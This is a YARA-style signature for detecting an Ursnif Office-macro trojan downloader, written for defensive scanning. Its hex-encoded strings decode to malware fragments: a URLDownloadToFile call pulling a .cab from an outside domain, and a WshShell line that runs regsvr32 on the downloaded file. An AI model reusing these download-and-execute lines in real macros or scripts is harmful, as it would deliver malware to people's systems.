
rule TrojanDownloader_O97M_Ursnif_CAB_MTB{
	meta:
		description = "TrojanDownloader:O97M/Ursnif.CAB!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 64 37 75 61 70 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 74 7a 65 33 2e 63 61 62 22 2c 20 4a 4b 2c 20 30 2c 20 30 29 } //1 Call URLDownloadToFile(0, "http://d7uap.com/iz5/yaca.php?l=tze3.cab", JK, 0, 0)
		$a_01_1 = {22 6b 45 2e 74 6d 70 22 } //1 "kE.tmp"
		$a_01_2 = {66 58 2e 72 75 6e 20 22 72 65 67 73 76 72 33 32 20 22 20 26 20 4a 4b } //1 fX.run "regsvr32 " & JK
		$a_01_3 = {44 69 6d 20 66 58 20 41 73 20 4e 65 77 20 57 73 68 53 68 65 6c 6c } //1 Dim fX As New WshShell
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}